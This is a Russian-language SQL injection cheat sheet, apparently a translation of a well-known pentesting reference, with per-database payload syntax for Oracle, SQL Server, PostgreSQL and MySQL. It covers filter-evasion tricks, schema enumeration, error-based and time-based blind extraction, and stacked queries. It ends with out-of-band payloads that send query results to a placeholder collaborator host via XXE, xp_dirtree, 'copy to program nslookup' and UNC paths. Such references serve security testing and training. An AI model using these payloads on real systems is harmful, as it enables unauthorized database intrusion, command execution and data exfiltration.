
## Конкатенация строк

| СУБД       | Синтаксис                                                                                 |
| ---------- | ----------------------------------------------------------------------------------------- |
| Oracle     | `'foo'\|\|'bar'`                                                                          |
| Microsoft  | `'foo'+'bar'`                                                                             |
| PostgreSQL | `'foo'\|\|'bar'`                                                                          |
| MySQL      | `'foo' 'bar'` [Обратите внимание на пробел между двумя строками]<br>`CONCAT('foo','bar')` |

## Подстрока

| СУБД | Синтаксис |
|------|-----------|
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

## Комментарии

| СУБД | Синтаксис |
|------|-----------|
| Oracle | `--comment` |
| Microsoft | `--comment`<br>`/*comment*/` |
| PostgreSQL | `--comment`<br>`/*comment*/` |
| MySQL | `#comment`<br>`-- comment` [Обратите внимание на пробел после двойного дефиса]<br>`/*comment*/` |

## Обход фильтров

Если приложение блокирует определённые ключевые слова или символы, вы всё ещё можете внедрить SQL, используя следующие приёмы. Обходы на основе кодирования, такие как URL-кодирование ключевых слов или использование `CHAR()` для построения строк, рассматриваются отдельно в разделе «Обфускация атак с использованием кодировок».

Ключевые слова SQL не чувствительны к регистру, поэтому вы можете варьировать регистр ввода, чтобы обойти фильтр, блокирующий конкретное ключевое слово. Например, если `SELECT` заблокирован, попробуйте `SeLeCT`.

Вы также можете использовать встроенные комментарии вместо пробелов, чтобы фильтр, ищущий ключевое слово, окружённое пробелами, не сработал. Например, `SELECT/**/username/**/FROM/**/users`.

В MySQL вы можете использовать версионные комментарии, чтобы скрыть ключевое слово от фильтра, но при этом база данных всё равно его выполнила. База данных выполняет содержимое комментария `/*! ... */`, поэтому `/*!SELECT*/` обрабатывается как `SELECT`.

## Версия базы данных

| СУБД       | Синтаксис                                                          |
| ---------- | ------------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |

## Содержимое базы данных

| СУБД | Синтаксис |
|------|-----------|
| Oracle | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## Условные ошибки

| СУБД       | Синтаксис                                                                               |
| ---------- | --------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## Извлечение данных через видимые сообщения об ошибках

| СУБД | Синтаксис |
|------|-----------|
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>`> Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>`> invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>`> XPATH syntax error: '\secret'` |

## Пакетные (или составные) запросы

Вы можете использовать пакетные запросы для последовательного выполнения нескольких запросов. Обратите внимание, что хотя последующие запросы и выполняются, их результаты не возвращаются приложению. Следовательно, этот приём в основном полезен в отношении слепых уязвимостей, где вы можете использовать второй запрос для вызова DNS-запроса, условной ошибки или временной задержки.

| СУБД | Синтаксис |
|------|-----------|
| Oracle | Не поддерживает пакетные запросы. |
| Microsoft | `QUERY-1-HERE; QUERY-2-HERE`<br>`QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |

**Примечание**

В MySQL пакетные запросы обычно не могут быть использованы для SQL-инъекций. Однако иногда это возможно, если целевое приложение использует определённые PHP или Python API для связи с базой данных MySQL.

## Временные задержки

| СУБД       | Синтаксис                             |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

## Условные временные задержки

| СУБД       | Синтаксис                                                                                                        |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

## DNS-запрос


| СУБД       | Синтаксис                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | Уязвимость (XXE) для вызова DNS-запроса. Уязвимость была исправлена, но существует множество неисправленных установок Oracle:<br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br>Следующая техника работает на полностью исправленных установках Oracle, но требует повышенных привилегий:<br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| MySQL      | Следующие техники работают только на Windows:<br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                     |

## DNS-запрос с эксфильтрацией данных

| СУБД       | Синтаксис                                                                                                                                                                                                                                                                                                                                   |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                       |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                              |
| PostgreSQL | `create OR replace function f() returns void as $$`<br>`declare c text;`<br>`declare p text;`<br>`begin`<br>`SELECT into p (SELECT YOUR-QUERY-HERE);`<br>`c := 'copy (SELECT '''') to program ''nslookup '\|\|p\|\|'.BURP-COLLABORATOR-SUBDOMAIN''';`<br>`execute c;`<br>`END;`<br>`$$ language plpgsql security definer;`<br>`SELECT f();` |
| MySQL      | Следующая техника работает только на Windows:<br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                  |